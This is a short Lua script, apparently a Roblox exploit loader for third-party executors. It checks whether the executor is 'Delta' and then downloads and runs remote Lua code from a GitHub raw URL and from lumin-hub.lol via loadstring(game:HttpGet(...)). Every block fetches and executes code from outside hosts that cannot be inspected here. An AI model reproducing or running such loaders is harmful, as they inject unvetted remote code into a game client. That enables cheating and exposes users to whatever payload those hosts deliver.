if identifyexecutor and identifyexecutor():lower():find("delta") then
    print("delta")
else
    spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
    end)
end


if identifyexecutor and identifyexecutor():lower():find("delta") then
    loadstring(game:HttpGet("https://lumin-hub.lol/deltaloader.lua", true))()
else
    loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua", true))()
end
